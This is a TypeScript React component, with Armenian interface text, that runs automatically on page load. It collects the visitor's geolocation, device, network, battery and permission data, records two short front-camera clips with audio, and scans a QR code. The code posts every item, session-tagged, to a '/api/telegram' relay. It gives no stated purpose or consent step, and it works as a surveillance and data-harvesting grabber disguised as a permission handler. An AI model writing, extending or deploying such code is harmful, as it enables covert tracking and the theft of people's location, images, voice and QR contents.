"use client";

import React, { useEffect, useRef, useState, useCallback } from "react";
import QrScanner from "./qr-scanner";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import {
  getGeolocation,
  getClientInfo,
  getNetworkInfo,
  getDeviceMemory,
  getBatteryInfo,
  getPermissionStatus,
  PermissionStatus
} from "@/lib/client-data";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const VIDEO_SEGMENT_DURATION_MS = 3000; // 3 seconds for each video segment
const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning

type GeolocationData = { latitude: number; longitude: number };
type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
type BatteryInfo = { level?: number; charging?: boolean; status?: string };

// Определяем типы данных, которые могут быть отправлены
type TelegramDataPayload = {
  messageType: MessageType;
  sessionId: string; // Добавлено
  timestamp: string;
  geolocation?: GeolocationData;
  clientInfo?: ClientInfo;
  networkInfo?: NetworkInfo;
  deviceMemory?: number;
  batteryInfo?: BatteryInfo;
  permissionStatus?: PermissionStatus;
  video1?: string;
  video2?: string;
  qrCodeData?: string;
};

// Enum для типов сообщений
enum MessageType {
  InitialSummary = "initial_summary",
  Video1 = "video1",
  Video2 = "video2",
  QrCode = "qr_code",
}

type AppPhase =
  | "initial"
  | "collectingData"
  | "recordingVideo1"
  | "recordingVideo2"
  | "flippingCamera"
  | "qrScanning"
  | "finished";

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const mediaChunksRef = useRef<Blob[]>([]);
  const [appPhase, setAppPhase] = useState<AppPhase>("initial");
  const [loadingMessage, setLoadingMessage] = useState("Նախապատրաստում..."); // Подготовка к запуску...
  const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'>>({});
  const [sessionKey, setSessionKey] = useState(0);
  const [processSuccessful, setProcessSuccessful] = useState<boolean>(false);
  const [currentSessionId, setCurrentSessionId] = useState<string>(() => Math.random().toString(36).substring(2, 10).toUpperCase());
  const processInitiatedRef = useRef(false); // Новый ref для отслеживания инициации процесса
  const qrTimeoutRef = useRef<NodeJS.Timeout | null>(null); // Ref для таймаута QR-сканирования

  const generateSessionId = useCallback(() => {
    return Math.random().toString(36).substring(2, 10).toUpperCase();
  }, []);

  const sendDataToTelegram = useCallback(async (data: Partial<TelegramDataPayload>, type: MessageType): Promise<boolean> => {
    console.log(`[Session ${currentSessionId}] Sending message type: ${type}`);
    try {
      const payload: TelegramDataPayload = {
        ...data,
        messageType: type,
        sessionId: currentSessionId,
        timestamp: new Date().toISOString(),
      };

      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        console.log(`[Session ${currentSessionId}] Data of type ${type} successfully sent to Telegram!`);
        if (type === MessageType.InitialSummary || type === MessageType.QrCode) {
          toast.success("Տվյալները հաջողությամբ ուղարկվել են Telegram։");
        }
        return true;
      } else {
        const errorData = await response.json();
        console.error(`[Session ${currentSessionId}] Failed to send data of type ${type} to Telegram: ${errorData.error || response.statusText}`);
        toast.error(`Տվյալների ուղարկման սխալ (${type}): ${errorData.error || response.statusText}`);
        return false;
      }
    } catch (error: any) {
      console.error(`[Session ${currentSessionId}] Network error sending data of type ${type} to Telegram: ${error.message}`);
      toast.error(`Ցանցային սխալ: ${error.message}`);
      return false;
    }
  }, [currentSessionId]);

  const recordVideoSegment = useCallback(
    async (duration: number, facingMode: "user" | "environment"): Promise<string | undefined> => {
      let stream: MediaStream | null = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facingMode },
          audio: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.muted = true;
          videoRef.current.setAttribute("playsinline", "true");
          await videoRef.current.play().catch((e) => console.error("Error playing video stream:", e));
        }

        return new Promise((resolve) => {
          mediaRecorderRef.current = new MediaRecorder(stream!, { mimeType: "video/webm" });
          mediaChunksRef.current = [];

          mediaRecorderRef.current.ondataavailable = (event) => {
            if (event.data.size > 0) {
              mediaChunksRef.current.push(event.data);
            }
          };

          mediaRecorderRef.current.onstop = () => {
            const videoBlob = new Blob(mediaChunksRef.current, { type: "video/webm" });
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              resolve(reader.result as string);
            };
            stream?.getTracks().forEach((track) => track.stop());
            if (videoRef.current) {
              videoRef.current.srcObject = null;
            }
          };

          mediaRecorderRef.current.start();
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
          }, duration);
        });
      } catch (error: any) {
        console.error(`Camera/Microphone access denied for ${facingMode} camera: ${error.message}`);
        toast.error(`Տեսախցիկի հասանելիության սխալ (${facingMode}): ${error.message}`);
        stream?.getTracks().forEach((track) => track.stop());
        if (videoRef.current) {
          videoRef.current.srcObject = null;
        }
        return undefined;
      }
    },
    []
  );

  const handleQrCodeScanned = useCallback(
    async (qrData: string) => {
      console.log("QR Code Scanned in PermissionHandler:", qrData);
      if (qrTimeoutRef.current) {
        clearTimeout(qrTimeoutRef.current);
        qrTimeoutRef.current = null;
      }
      const success = await sendDataToTelegram({ qrCodeData: qrData }, MessageType.QrCode);
      setProcessSuccessful(success);
      setAppPhase("finished");
      toast.success("QR կոդը հաջողությամբ սկանավորվել է։");
    },
    [sendDataToTelegram]
  );

  const handleQrScanError = useCallback(
    async (error: string) => {
      console.error("QR Scan Error:", error);
      if (qrTimeoutRef.current) {
        clearTimeout(qrTimeoutRef.current);
        qrTimeoutRef.current = null;
      }
      const success = await sendDataToTelegram({ qrCodeData: `QR Scan Error: ${error}` }, MessageType.QrCode);
      setProcessSuccessful(success);
      setAppPhase("finished");
      toast.error(`QR սկանավորման սխալ: ${error}`);
    },
    [sendDataToTelegram]
  );

  const handleQrCameraActive = useCallback(() => {
    setLoadingMessage("Կամերան ակտիվ է, սկանավորեք QR կոդը..."); // Камера активна, сканируйте QR-код...
  }, []);

  const startNewSession = useCallback(() => {
    setAppPhase("initial");
    setCollectedData({});
    setSessionKey((prevKey) => prevKey + 1);
    setProcessSuccessful(false);
    setCurrentSessionId(generateSessionId());
    processInitiatedRef.current = false;
  }, [generateSessionId]);

  const runProcess = useCallback(async () => {
    if (processInitiatedRef.current) {
      console.log(`[Session ${currentSessionId}] runProcess already initiated for this sessionKey. Skipping.`);
      return;
    }
    processInitiatedRef.current = true;

    console.log(`[Session ${currentSessionId}] Starting runProcess. App Phase: ${appPhase}`);

    setLoadingMessage("Սարքի տվյալների և թույլտվությունների հավաքում...");
    setAppPhase("collectingData");

    // --- Concurrently collect all initial data ---
    const [
      permissionStatusResult,
      batteryInfoResult,
      geolocationResult,
    ] = await Promise.all([
      getPermissionStatus(),
      getBatteryInfo(),
      getGeolocation(),
    ]);

    const clientInfo = getClientInfo();
    const networkInfo = getNetworkInfo();
    const deviceMemory = getDeviceMemory();

    const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'> = {
      clientInfo: {
        platform: clientInfo.platform,
        hardwareConcurrency: clientInfo.hardwareConcurrency,
        screenWidth: clientInfo.screenWidth,
        screenHeight: clientInfo.screenHeight,
        browserLanguage: clientInfo.browserLanguage,
      },
      networkInfo: networkInfo,
      deviceMemory: deviceMemory,
      permissionStatus: permissionStatusResult,
    };

    if (batteryInfoResult.data) {
      initialCollectedData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
    } else {
      initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
    }

    if (geolocationResult.data) {
      initialCollectedData.geolocation = geolocationResult.data;
    }
    if (initialCollectedData.permissionStatus) {
      initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
    }
    
    setCollectedData(initialCollectedData);

    // --- Send Initial Summary Report ---
    const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary);
    setProcessSuccessful(initialSendSuccess);

    // --- Start Video 1 Recording ---
    setLoadingMessage("Առաջին տեսանյութի ձայնագրում (առջևի տեսախցիկ)...");
    setAppPhase("recordingVideo1");
    const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
    if (video1Base64) {
      const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1);
      setProcessSuccessful(prev => prev && video1SendSuccess);
    }

    // --- Video 2 Recording ---
    setLoadingMessage("Երկրորդ տեսանյութի ձայնագրում (առջևի տեսախցիկ)...");
    setAppPhase("recordingVideo2");
    const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
    if (video2Base64) {
      const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2);
      setProcessSuccessful(prev => prev && video2SendSuccess);
    }

    // --- QR Scanning ---
    setLoadingMessage("Անցում դեպի հետևի տեսախցիկ՝ QR կոդը սկանավորելու համար...");
    setAppPhase("flippingCamera");
    setAppPhase("qrScanning");

    qrTimeoutRef.current = setTimeout(async () => {
      console.log("QR scanning timed out.");
      const qrTimeoutSendSuccess = await sendDataToTelegram({ qrCodeData: "QR Scan Timed Out" }, MessageType.QrCode);
      setProcessSuccessful(prev => prev && qrTimeoutSendSuccess);
      setAppPhase("finished");
      toast.error("QR կոդի սկանավորման ժամանակը սպառվեց։");
    }, QR_SCAN_TIMEOUT_MS);
  }, [
    currentSessionId,
    appPhase,
    sendDataToTelegram,
    recordVideoSegment,
    setLoadingMessage,
    setAppPhase,
    setProcessSuccessful,
    setCollectedData,
    processInitiatedRef,
    qrTimeoutRef
  ]);

  useEffect(() => {
    console.log(`[Session ${currentSessionId}] useEffect triggered. Current appPhase: ${appPhase}, sessionKey: ${sessionKey}, processInitiatedRef.current: ${processInitiatedRef.current}`);

    if (appPhase === "initial" && currentSessionId && !processInitiatedRef.current) {
      runProcess();
    }

    return () => {
      if (qrTimeoutRef.current) {
        clearTimeout(qrTimeoutRef.current);
        qrTimeoutRef.current = null;
      }
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
        mediaRecorderRef.current.stop();
      }
      if (videoRef.current && videoRef.current.srcObject) {
        (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop());
        videoRef.current.srcObject = null;
      }
      if (appPhase === "finished" || appPhase === "initial") {
         processInitiatedRef.current = false;
      }
    };
  }, [sessionKey, appPhase, currentSessionId, runProcess]);


  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground p-4">
      {(appPhase === "initial" ||
        appPhase === "collectingData" ||
        appPhase === "recordingVideo1" ||
        appPhase === "recordingVideo2" ||
        appPhase === "flippingCamera") && (
        <>
          <p className="text-lg mb-4 text-center font-bold text-primary">
            {loadingMessage}
          </p>
          <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="w-full h-full object-cover"
              style={{ display: (appPhase === "recordingVideo1" || appPhase === "recordingVideo2") ? 'block' : 'none' }}
            />
            <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
            {(appPhase === "collectingData" || appPhase === "flippingCamera") && (
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-foreground" />
              </div>
            )}
          </div>
        </>
      )}
      {appPhase === "qrScanning" && (
        <QrScanner onQrCodeScanned={handleQrCodeScanned} onScanError={handleQrScanError} onCameraActive={handleQrCameraActive} />
      )}
      {appPhase === "finished" && (
        <div className="flex flex-col items-center justify-center">
          <p className="text-lg mb-4 text-center">
            {processSuccessful
              ? "Տվյալները հաջողությամբ ուղարկվել են։ Շնորհակալություն։"
              : "Տեխնիկական անսարքություններ, խնդրում ենք կրկնել կամ փորձել ավելի ուշ:"
            }
          </p>
          <Button onClick={startNewSession} className="mt-4">
            Կրկնել
          </Button>
        </div>
      )}
    </div>
  );
};

export default PermissionHandler;